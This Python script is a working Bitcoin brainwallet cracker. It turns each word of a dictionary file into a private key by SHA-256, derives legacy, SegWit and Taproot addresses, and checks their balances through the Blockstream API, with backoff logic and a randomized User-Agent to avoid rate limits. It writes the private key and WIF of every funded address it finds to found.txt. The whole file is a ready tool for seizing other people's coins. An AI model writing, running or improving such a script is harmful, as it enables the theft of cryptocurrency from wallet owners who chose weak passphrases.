#!/usr/bin/env python3
# brute2.py
# iSH-friendly scanner using Blockstream API only, tuned to avoid 4xx.
# Defaults: dictionary.txt -> found.txt, no CLI args.

from __future__ import annotations
import io, sys, time, binascii, hashlib, logging, random
import requests

# crypto libs
try:
    import ecdsa, base58
except Exception:
    print("Install required libs: pip3 install requests ecdsa base58")
    raise

# optional coincurve for taproot (p2tr)
try:
    import coincurve
    HAVE_COINCURVE = True
except Exception:
    HAVE_COINCURVE = False

# --- minimal bech32 / segwit helpers (BIP173) ---
CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
def bech32_polymod(values):
    GENERATORS = [0x3b6a57b2,0x26508e6d,0x1ea119fa,0x3d4233dd,0x2a1462b3]
    chk = 1
    for v in values:
        top = chk >> 25
        chk = ((chk & 0x1ffffff) << 5) ^ v
        for i in range(5):
            if ((top >> i) & 1):
                chk ^= GENERATORS[i]
    return chk

def bech32_hrp_expand(hrp):
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]

def bech32_create_checksum(hrp, data, spec='bech32'):
    const = 1 if spec == 'bech32' else 0x2bc830a3
    values = bech32_hrp_expand(hrp) + data
    polymod = bech32_polymod(values + [0]*6) ^ const
    return [(polymod >> 5*(5-i)) & 31 for i in range(6)]

def bech32_encode(hrp, data, spec='bech32'):
    combined = data + bech32_create_checksum(hrp, data, spec=spec)
    return hrp + '1' + ''.join([CHARSET[d] for d in combined])

def convertbits(data, frombits, tobits, pad=True):
    acc = 0; bits = 0; ret = []; maxv = (1 << tobits) - 1
    for value in data:
        if value < 0 or (value >> frombits):
            return None
        acc = (acc << frombits) | value
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits:
            ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv):
        return None
    return ret

def segwit_addr_encode(hrp, witver, witprog):
    if witver < 0 or witver > 16 or len(witprog) < 2 or len(witprog) > 40:
        return None
    data = [witver] + convertbits(list(witprog), 8, 5)
    spec = 'bech32' if witver == 0 else 'bech32m'
    return bech32_encode(hrp, data, spec=spec)

# ------------------ Wallet (lightweight) ------------------
class Wallet:
    def __init__(self, passphrase, is_private_key=False):
        self.passphrase = passphrase
        self.is_private_key = bool(is_private_key)
        if self.is_private_key:
            if self._looks_like_hex(passphrase):
                self.private_key = passphrase.lower()
            else:
                self.private_key = self._wif_to_hex(passphrase)
        else:
            self.private_key = binascii.hexlify(hashlib.sha256(passphrase.encode('utf-8')).digest()).decode()
        self.wif = self._hex_to_wif(self.private_key)
        self.pubkey_compressed = self._priv_to_compressed_pubkey(self.private_key)
        self.addresses = {}
        self.addresses['p2pkh'] = self._p2pkh_from_pubkey(self.pubkey_compressed)
        self.addresses['p2wpkh'] = self._p2wpkh_bech32(self.pubkey_compressed)
        self.addresses['p2sh-p2wpkh'] = self._p2sh_p2wpkh(self.pubkey_compressed)
        self.addresses['p2tr'] = self._maybe_p2tr()

    def _looks_like_hex(self, s):
        try:
            int(s, 16)
            return len(s) in (64, 66)
        except Exception:
            return False

    def _hex_to_wif(self, priv_hex, compressed=True):
        b = binascii.unhexlify(priv_hex)
        payload = b'\x80' + b
        if compressed:
            payload += b'\x01'
        checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
        return base58.b58encode(payload + checksum).decode()

    def _wif_to_hex(self, wif):
        try:
            raw = base58.b58decode(wif)
            payload = raw[:-4]
            if len(payload) == 34 and payload[-1] == 0x01:
                key = payload[1:-1]
            else:
                key = payload[1:]
            return binascii.hexlify(key).decode()
        except Exception:
            return ""

    def _priv_to_compressed_pubkey(self, priv_hex):
        priv = binascii.unhexlify(priv_hex)
        sk = ecdsa.SigningKey.from_string(priv, curve=ecdsa.SECP256k1)
        vk = sk.get_verifying_key()
        px = vk.to_string()
        x = px[:32]; y = px[32:]
        prefix = b'\x02' if (y[-1] % 2 == 0) else b'\x03'
        return prefix + x

    def _hash160(self, data_bytes):
        return hashlib.new('ripemd160', hashlib.sha256(data_bytes).digest()).digest()

    def _p2pkh_from_pubkey(self, pubkey_bytes):
        rip = self._hash160(pubkey_bytes)
        pref = b'\x00' + rip
        checksum = hashlib.sha256(hashlib.sha256(pref).digest()).digest()[:4]
        return base58.b58encode(pref + checksum).decode()

    def _p2wpkh_bech32(self, pubkey_bytes):
        witprog = self._hash160(pubkey_bytes)
        return segwit_addr_encode("bc", 0, witprog)

    def _p2sh_p2wpkh(self, pubkey_bytes):
        witprog = self._hash160(pubkey_bytes)
        redeem = b'\x00\x14' + witprog
        redeem_hash = hashlib.new('ripemd160', hashlib.sha256(redeem).digest()).digest()
        pref = b'\x05' + redeem_hash
        checksum = hashlib.sha256(hashlib.sha256(pref).digest()).digest()[:4]
        return base58.b58encode(pref + checksum).decode()

    def _maybe_p2tr(self):
        if not HAVE_COINCURVE:
            return None
        try:
            priv_bytes = binascii.unhexlify(self.private_key)
            pub = coincurve.PublicKey.from_valid_secret(priv_bytes)
            full = pub.format(compressed=False)
            x = full[1:33]
            def tagged_hash(tag, msg):
                tag_hash = hashlib.sha256(tag.encode()).digest()
                return hashlib.sha256(tag_hash + tag_hash + msg).digest()
            tweak = tagged_hash("TapTweak", x)
            Q = pub.add(tweak)
            Q_raw = Q.format(compressed=False)
            Qx = Q_raw[1:33]
            return segwit_addr_encode("bc", 1, Qx)
        except Exception:
            return None

# ------------------ Blockstream API client ------------------
class BlockstreamClient:
    BASE = "https://blockstream.info/api/address/"
    def __init__(self, timeout=15):
        self.s = requests.Session()
        # Polite headers (random small UA suffix to vary across runs)
        ua = "brute2-ish/1.0 (+https://example) iSH/{}".format(random.randint(1000,9999))
        self.s.headers.update({"User-Agent": ua, "Accept": "application/json"})
        self.timeout = timeout

    def get_balance(self, address):
        url = self.BASE + address
        r = self.s.get(url, timeout=self.timeout)
        # raise for status - we'll handle statuses above
        r.raise_for_status()
        j = r.json()
        cs = j.get("chain_stats", {})
        funded = cs.get("funded_txo_sum", 0)
        spent = cs.get("spent_txo_sum", 0)
        bal_sats = int(funded) - int(spent)
        return float(bal_sats) / 1e8

# ------------------ Main scanning logic ------------------
def main():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s: %(message)s')
    DICT_FILE = "dictionary.txt"
    OUT_FILE = "found.txt"
    SLEEP_BETWEEN_REQUESTS = 3.0      # conservative by default; increase if still getting 429
    MAX_RETRIES_TRANSIENT = 3        # for timeouts / 5xx
    MAX_RETRIES_429 = 3              # number of 429 backoff tries (longer backoff)
    TIMEOUT = 15

    client = BlockstreamClient(timeout=TIMEOUT)

    try:
        fdict = io.open(DICT_FILE, 'rt', encoding='utf-8')
    except Exception as e:
        print("Cannot open dictionary.txt:", e)
        sys.exit(1)

    try:
        fout = open(OUT_FILE, 'w', encoding='utf-8')
        fout.write("dictionary_word,address_type,address,current_balance_btc,private_hex,wif\n")
    except Exception as e:
        print("Cannot open found.txt:", e)
        sys.exit(1)

    addr_types = ['p2wpkh','p2sh-p2wpkh','p2pkh','p2tr'] if HAVE_COINCURVE else ['p2wpkh','p2sh-p2wpkh','p2pkh']

    for raw in fdict:
        word = raw.rstrip()
        if not word:
            continue
        # create wallet
        try:
            wallet = Wallet(word)
        except Exception as e:
            print(f"Wallet creation failed for {word}: {e}")
            continue

        for atype in addr_types:
            addr = wallet.addresses.get(atype)
            if not addr:
                continue

            # Try loop: handle 429 specially, do not retry on other 4xx
            got_balance = None

            # first attempt with minimal retries for transient errors
            attempt = 0
            while attempt < MAX_RETRIES_TRANSIENT:
                attempt += 1
                try:
                    bal = client.get_balance(addr)
                    got_balance = float(bal)
                    break
                except requests.exceptions.HTTPError as he:
                    status = None
                    try:
                        status = he.response.status_code
                    except Exception:
                        pass
                    # If server says Too Many Requests -> handle with extended backoff and limited retries
                    if status == 429:
                        # try a separate 429 loop (longer sleeps)
                        for i in range(1, MAX_RETRIES_429+1):
                            back = 10 * i  # 10s,20s,30s...
                            print(f"429 from Blockstream for {addr} — sleeping {back}s (attempt {i}/{MAX_RETRIES_429})")
                            time.sleep(back)
                            try:
                                bal = client.get_balance(addr)
                                got_balance = float(bal)
                                break
                            except Exception as e:
                                print(f"Retry after 429 failed for {addr}: {e}")
                                continue
                        # break out of transient attempt loop regardless (we either got it or exhausted 429 retries)
                        break
                    # For other 4xx (client errors) -> log and skip immediately (no retries)
                    if status and 400 <= status < 500:
                        print(f"Client error {status} for {addr} — skipping address (no retries).")
                        got_balance = None
                        attempt = MAX_RETRIES_TRANSIENT  # force exit
                        break
                    # For 5xx treat as transient and retry below
                    print(f"HTTPError (status={status}) fetching {addr}: {he} — retry {attempt}/{MAX_RETRIES_TRANSIENT}")
                    sleep = (2 ** (attempt-1)) * (0.5 + random.random())
                    time.sleep(sleep)
                    continue
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as neterr:
                    print(f"Network error fetching {addr}: {neterr} — retry {attempt}/{MAX_RETRIES_TRANSIENT}")
                    sleep = (2 ** (attempt-1)) * (0.5 + random.random())
                    time.sleep(sleep)
                    continue
                except Exception as e:
                    # unexpected parsing etc. treat as transient but log
                    print(f"Error fetching {addr}: {e} — retry {attempt}/{MAX_RETRIES_TRANSIENT}")
                    sleep = (2 ** (attempt-1)) * (0.5 + random.random())
                    time.sleep(sleep)
                    continue

            # End of attempts for this address
            if got_balance is None:
                # either client 4xx skipped, or retries exhausted — log and move on
                print(f"No usable balance for {addr} (skipped or failed).")
                time.sleep(SLEEP_BETWEEN_REQUESTS)
                continue

            # If we have a balance (including zero), process:
            try:
                balance_val = float(got_balance)
            except Exception:
                print(f"Parsing balance failed for {addr}: {got_balance}")
                time.sleep(SLEEP_BETWEEN_REQUESTS)
                continue

            if balance_val > 0.0:
                line = f"{word},{atype},{addr},{balance_val:.8f},{wallet.private_key},{wallet.wif}"
                print("FOUND:", line)
                fout.write(line + "\n"); fout.flush()

            # polite sleep to avoid hitting limits — adjust SLEEP_BETWEEN_REQUESTS upward if you still see 429
            time.sleep(SLEEP_BETWEEN_REQUESTS)

    fout.close()
    fdict.close()
    print("Done.")

if __name__ == "__main__":
    main()